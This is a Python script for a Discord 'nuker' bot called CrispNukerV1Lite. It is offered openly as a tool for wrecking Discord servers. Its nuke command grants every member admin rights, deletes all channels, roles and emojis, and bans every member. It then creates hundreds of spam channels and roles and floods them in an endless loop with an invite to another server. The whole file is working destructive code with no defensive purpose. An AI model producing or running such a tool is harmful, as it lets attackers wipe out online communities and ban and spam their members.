import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import subprocess
import os
from os import system
import colorama
from colorama import init, Fore, Back, Style
import discord
from discord.ext import commands
import requests
import time
import colorama 
from colorama import Fore
import requests, os, threading, discord, time
from colorama import Fore
from colored import fg, attr
from discord.ext import commands
from pypresence import Presence

font_color = fg('#ccc900')
granted = fg('#59ff00')
denied = fg('#ff0019')
df_color = fg('#0b678f')
df_yellow = fg('#ccc900')

token = input("Token: ")
spam_channel_name = input("Spam Channel Name: ")
spam_message_text = input("Spam Message Text: ")
locked_serverlink = "https://discord.gg/MCZKVXjHv6"

role_name = input("Role Name: ")


client = commands.Bot(command_prefix=",")

system("cls")
@client.event
async def on_ready():
   print(f''' 

{font_color}        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{font_color}             ✡ | Client       : {granted}{client.user.name}
{font_color}             ✡ | Author       : $$#5215 
{font_color}             ✡ | Server       : Noxious
{font_color}        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{df_color}{df_color}[+]{df_yellow}{df_yellow} Start: ",nuke" ; Stop: ",stop"
{df_color}{df_color}[+]{df_yellow}{df_yellow} Follow me on {df_color}TWT: @KiseeIsHere
 ''')



@client.command()
@commands.is_owner()
async def stop(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{df_color}[+]{df_yellow} {client.user.name} has logged out successfully." + Fore.RESET)



@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(f"{df_color}[+]{df_yellow} {granted}everyone admin." + Fore.RESET)
    except:
      print(f"{df_color}[+]{df_yellow} {denied} everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(f"{df_color}[+]{df_yellow} {channel.name} DELETED" + Fore.RESET)
      except:
        print(f"{df_color}[+]{df_yellow} {channel.name} NOT DELETED" + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(f"{df_color}[+]{df_yellow} {member.name}#{member.discriminator} BANNED" + Fore.RESET)
     except:
       print(f"{df_color}[+]{df_yellow} {member.name}#{member.discriminator} NOT BANNED" + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(f"{df_color}[+]{df_yellow} {role.name} DELETED" + Fore.RESET)
     except:
       print(f"{df_color}[+]{df_yellow} {role.name} NOT DELETED" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(f"{df_color}[+]{df_yellow} {emoji.name} DELETED" + Fore.RESET)
     except:
       print(f"{df_color}[+]{df_yellow} {emoji.name} NOT DELETED" + Fore.RESET)

    await guild.create_text_channel(spam_channel_name)
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"{df_color}[+]{df_yellow} Join {locked_serverlink}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(spam_channel_name)
       await guild.create_role(name=role_name)
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
         print(f"{df_color}[+]{df_yellow} {guild.name} Successfully Nuked using CrispNukerV1Lite")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(spam_message_text + locked_serverlink)

client.run(token, bot=True)